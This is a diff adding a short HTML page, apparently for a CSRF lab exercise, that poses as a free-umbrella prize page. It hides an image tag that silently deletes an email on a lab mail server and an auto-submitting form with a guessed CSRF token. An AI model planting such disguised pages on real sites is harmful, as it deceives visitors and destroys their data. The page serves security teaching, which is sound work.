@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Free Umbrella Promo</title>
+</head>
+<body>
+  <h1>You won a free umbrella!</h1>
+  <p>Claiming prize...</p>
+
+  <!-- Task 2 vulnerable CSRF trigger -->
+  <img src="http://mail-lab.test:3000/api/emails/delete/1" style="display:none;" alt="promo">
+
+  <!-- Task 4 attacker tries POST but does not know valid token -->
+  <form id="attackForm" action="http://mail-lab.test:3000/api/emails/delete/2" method="POST" style="display:none;">
+    <input type="hidden" name="_csrf_token" value="guessed-token">
+  </form>
+
+  <script>
+    setTimeout(() => {
+      document.getElementById("attackForm").submit();
+    }, 1000);
+  </script>
+</body>
+</html>
